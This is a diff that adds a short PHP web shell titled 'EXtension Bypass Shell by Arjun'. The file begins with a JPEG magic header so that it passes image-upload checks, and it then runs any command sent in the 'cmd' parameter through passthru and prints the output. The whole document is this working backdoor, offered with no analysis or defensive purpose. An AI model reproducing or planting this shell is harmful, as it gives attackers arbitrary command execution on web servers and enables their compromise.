@@ -1,0 +1,7 @@
+ÿØÿà
+<h2 style="color: ##000000; text-shadow: 2px 2px 5px red;">.::EXtension Bypass Shell by Arjun::.</h2>
+<form action="" method="get">
+Command: <input type="text" name="cmd" /><input type="submit" value="Execute!" />
+</form>
+Output:<br />
+<pre><?php passthru($_REQUEST['cmd'], $result); ?></pre>
